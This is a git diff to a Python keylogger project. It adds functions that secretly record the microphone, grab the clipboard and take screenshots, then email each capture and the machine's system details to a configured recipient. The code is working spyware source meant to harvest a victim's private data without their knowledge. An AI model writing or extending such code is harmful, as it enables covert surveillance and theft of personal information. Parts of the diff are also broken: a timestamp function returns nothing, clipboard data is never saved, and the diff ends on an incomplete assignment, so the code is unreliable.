@@ -42,6 +42,9 @@ from keylogger.config import Config
 config = Config()
 config = config.load()
 
+cur_time = time.time()
+iter_limit = 0
+
 count = 0
 keys = []  # Empty list to append keys to
 
@@ -61,7 +64,7 @@ def __get_timestamp__():
     t = time.localtime()
     current_time = time.strftime("%H:%M:%S", t)
 
-    return current_time
+    return
 
 
 def send_email(filename, attachment, to_addr):
@@ -176,11 +179,54 @@ def comp_info():
         f.write(f'System: {platform.system()} {platform.version()}\n')
         f.write(f'Machine: {platform.machine()}\n')
         f.write(f'Hostname: {hostname}\n')
-        f.write(f'Private IP: {ip_addr}\n\n{"*" * 10 }\n\n')
+        f.write(f'Private IP: {ip_addr}\n\n{"*" * 10}\n\n')
 
 
 comp_info()
 send_email('sysinfo.txt', config.get('FILES', 'sysinfo-store'), config.get('SENDMAIL.PARTIES', 'dest'))
+
+
+def microphone():
+    sample_hz = 44100
+    duration = config.getint('MIC', 'duration')
+
+    clip = sd.rec(duration * sample_hz, samplerate=sample_hz, channels=2)
+
+    # Wait for recording to finish...
+    sd.wait()
+
+    write(config.get('FILES', 'audio-store'), sample_hz, clip)
+
+
+microphone()
+send_email('audio.wav', config.get('FILES', 'audio-store'), config.get('SENDMAIL.PARTIES', 'dest'))
+
+
+def copy_clipboard():
+    with open(config.get('FILES', 'clipboard-store'), 'a') as f:
+        try:
+            win32clipboard.OpenClipboard()
+            clip_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+        except:
+            f.write('Clipboard could not be copied')
+
+
+copy_clipboard()
+send_email('clipboard.txt', config.get('FILES', 'clipboard-store'), config.get('SENDMAIL.PARTIES', 'dest'))
+
+
+def screenshot():
+    img = ImageGrab.grab()
+    img.save(config.get('FILES', 'ss-store'))
+
+
+screenshot()
+send_email('ss.png', config.get('FILES', 'ss-store'), config.get('SENDMAIL.PARTIES', 'dest'))
+
+
+iter_limit =
 
 
 def on_press(key):
